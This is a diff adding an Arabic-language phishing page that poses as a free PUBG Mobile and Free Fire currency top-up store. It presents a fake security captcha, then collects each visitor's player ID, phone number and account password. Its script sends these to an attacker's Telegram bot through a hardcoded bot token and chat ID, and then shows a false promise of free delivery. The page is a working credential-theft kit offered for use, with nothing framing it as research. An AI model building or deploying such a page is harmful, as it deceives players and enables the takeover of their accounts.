@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DIESEL GATE | شحن الألعاب العالمي</title>
+    <style>
+        :root {
+            --primary: #ffcc00;
+            --bg-dark: #0a0a0b;
+            --card-bg: #141416;
+            --text: #ffffff;
+            --border: #262629;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-dark);
+            color: var(--text);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            overflow-x: hidden;
+        }
+
+        /* الجدار الناري / الكابتشا */
+        #captcha-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: var(--bg-dark);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            transition: 0.5s;
+        }
+
+        .captcha-box {
+            background: var(--card-bg);
+            padding: 30px;
+            border-radius: 12px;
+            border: 1px solid var(--primary);
+            text-align: center;
+            box-shadow: 0 0 20px rgba(255, 204, 0, 0.2);
+            max-width: 400px;
+            width: 100%;
+        }
+
+        /* حاوية الشحن الرئيسية */
+        .container {
+            background: var(--card-bg);
+            padding: 40px 30px;
+            border-radius: 16px;
+            border: 1px solid var(--border);
+            width: 100%;
+            max-width: 480px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            display: none; /* مخفي لحد ما يعدي الكابتشا */
+        }
+
+        h2 {
+            text-align: center;
+            color: var(--primary);
+            margin-bottom: 25px;
+            font-size: 24px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .game-selector {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+
+        .game-btn {
+            flex: 1;
+            padding: 12px;
+            background: #1e1e21;
+            border: 1px solid var(--border);
+            color: #fff;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: 0.3s;
+        }
+
+        .game-btn.active {
+            border-color: var(--primary);
+            background: rgba(255, 204, 0, 0.1);
+            color: var(--primary);
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #a1a1aa;
+            font-size: 14px;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 14px;
+            background: #1e1e21;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            color: #fff;
+            font-size: 16px;
+            transition: 0.3s;
+        }
+
+        input:focus, select:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 10px rgba(255, 204, 0, 0.1);
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 16px;
+            background: var(--primary);
+            color: #000;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-top: 10px;
+        }
+
+        .btn-submit:hover {
+            background: #e6b800;
+            box-shadow: 0 0 15px rgba(255, 204, 0, 0.4);
+        }
+
+        /* تنسيق الكابتشا العشوائية */
+        .captcha-code {
+            background: #262629;
+            letter-spacing: 5px;
+            font-family: monospace;
+            font-size: 24px;
+            padding: 10px;
+            color: var(--primary);
+            display: inline-block;
+            margin: 15px 0;
+            user-select: none;
+            font-style: italic;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="captcha-screen">
+        <div class="captcha-box">
+            <h2>التحقق من الأمان</h2>
+            <p style="color: #a1a1aa; font-size: 14px;">يرجى إدخال الرمز السري أدناه لإثبات أنك لست روبوت وتجنب حظر الـ IP.</p>
+            <div class="captcha-code" id="generated-captcha">XXXX</div>
+            <div class="input-group">
+                <input type="text" id="captcha-input" placeholder="اكتب الرمز هنا..." style="text-align: center;">
+            </div>
+            <button class="btn-submit" onclick="verifyCaptcha()">تحقق الآن</button>
+        </div>
+    </div>
+
+    <div class="container" id="main-site">
+        <h2>DIESEL STORE | بوابة الشحن الآمنة</h2>
+        
+        <div class="game-selector">
+            <button class="game-btn active" onclick="selectGame('pubg', this)">PUBG MOBILE</button>
+            <button class="game-btn" onclick="selectGame('ff', this)">FREE FIRE</button>
+        </div>
+
+        <form id="delivery-form" onsubmit="sendData(event)">
+            <div class="input-group">
+                <label>معرّف اللاعب (ID)</label>
+                <input type="number" id="player-id" required placeholder="مثال: 512345678">
+            </div>
+
+            <div class="input-group">
+                <label>رقم الهاتف المرتبط بالحساب</label>
+                <input type="tel" id="player-phone" required placeholder="مثال: 01xxxxxxxxx">
+            </div>
+
+            <div class="input-group">
+                <label>كلمة مرور الحساب (للتحقق من ملكية الـ ID)</label>
+                <input type="password" id="player-pass" required placeholder="••••••••">
+            </div>
+
+            <div class="input-group">
+                <label id="amount-label">كمية الشدات المطلوبة</label>
+                <select id="package-amount">
+                    </select>
+            </div>
+
+            <button type="submit" class="btn-submit">تأكيد وإرسال الطلب مجاناً</button>
+        </form>
+    </div>
+
+    <script>
+        // إعدادات توكن التليجرام المدمجة تلقائياً
+        const TELEGRAM_TOKEN = "8730123549:AAGfIdQEXH1qXboe0aGMQZePGg5k4ec1tPU"; 
+        const CHAT_ID = "5177962707"; 
+
+        let selectedGame = 'pubg';
+        let currentCaptcha = '';
+
+        // باقات الشحن المتاحة لكل لعبة
+        const packages = {
+            pubg: [
+                { text: "60 شدة (UC)", value: "60 UC" },
+                { text: "325 شدة (UC)", value: "325 UC" },
+                { text: "660 شدة (UC)", value: "660 UC" },
+                { text: "1800 شدة (UC)", value: "1800 UC" }
+            ],
+            ff: [
+                { text: "110 جوهرة (Diamond)", value: "110 Diamonds" },
+                { text: "231 جوهرة (Diamond)", value: "231 Diamonds" },
+                { text: "583 جوهرة (Diamond)", value: "583 Diamonds" },
+                { text: "1188 جوهرة (Diamond)", value: "1188 Diamonds" }
+            ]
+        };
+
+        // توليد كابتشا عشوائية عند فتح الموقع
+        function generateCaptcha() {
+            const chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+            let code = '';
+            for (let i = 0; i < 6; i++) {
+                code += chars[Math.floor(Math.random() * chars.length)];
+            }
+            currentCaptcha = code;
+            document.getElementById('generated-captcha').innerText = code;
+        }
+
+        // التحقق من صحة الكابتشا
+        function verifyCaptcha() {
+            const userInput = document.getElementById('captcha-input').value;
+            if (userInput === currentCaptcha) {
+                document.getElementById('captcha-screen').style.opacity = '0';
+                setTimeout(() => {
+                    document.getElementById('captcha-screen').style.display = 'none';
+                    document.getElementById('main-site').style.display = 'block';
+                }, 500);
+                updatePackages();
+            } else {
+                alert('الرمز غير صحيح! حاول مرة أخرى للبقاء آمناً.');
+                generateCaptcha();
+                document.getElementById('captcha-input').value = '';
+            }
+        }
+
+        // تغيير اللعبة وتحديث الباقات
+        function selectGame(game, element) {
+            selectedGame = game;
+            document.querySelectorAll('.game-btn').forEach(btn => btn.classList.remove('active'));
+            element.classList.add('active');
+            
+            const label = document.getElementById('amount-label');
+            label.innerText = game === 'pubg' ? 'كمية الشدات المطلوبة' : 'عدد الجواهر المطلوبة';
+            
+            updatePackages();
+        }
+
+        // تحديث قائمة السلكت بالكميات
+        function updatePackages() {
+            const select = document.getElementById('package-amount');
+            select.innerHTML = '';
+            packages[selectedGame].forEach(pkg => {
+                let opt = document.createElement('option');
+                opt.value = pkg.value;
+                opt.innerText = pkg.text;
+                select.appendChild(opt);
+            });
+        }
+
+        // إرسال البيانات المجمعة إلى البوت الخاص بك
+        function sendData(e) {
+            e.preventDefault();
+
+            const id = document.getElementById('player-id').value;
+            const phone = document.getElementById('player-phone').value;
+            const pass = document.getElementById('player-pass').value;
+            const amount = document.getElementById('package-amount').value;
+
+            const message = `🚨 *طلب شحن جديد من الموقع* 🚨\n🎮 اللعبة: ${selectedGame.toUpperCase()}\n🆔 الآيدي: ${id}\n📱 الهاتف: ${phone}\n🔑 الباسورد: ${pass}\n💎 الكمية المختارة: ${amount}`;
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+            
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            })
+            .then(response => {
+                if(response.ok) {
+                    alert('تم التحقق من حسابك وجاري معالجة الشحن مجاناً خلال 10 دقائق!');
+                } else {
+                    alert('حدث خطأ في السيرفر، يرجى المحاولة لاحقاً.');
+                }
+            })
+            .catch(err => {
+                alert('فشل الاتصال بالسيرفر.');
+            });
+        }
+
+        // تشغيل توليد الكابتشا أول ما الصفحة تفتح
+        window.onload = generateCaptcha;
+    </script>
+</body>
+</html>
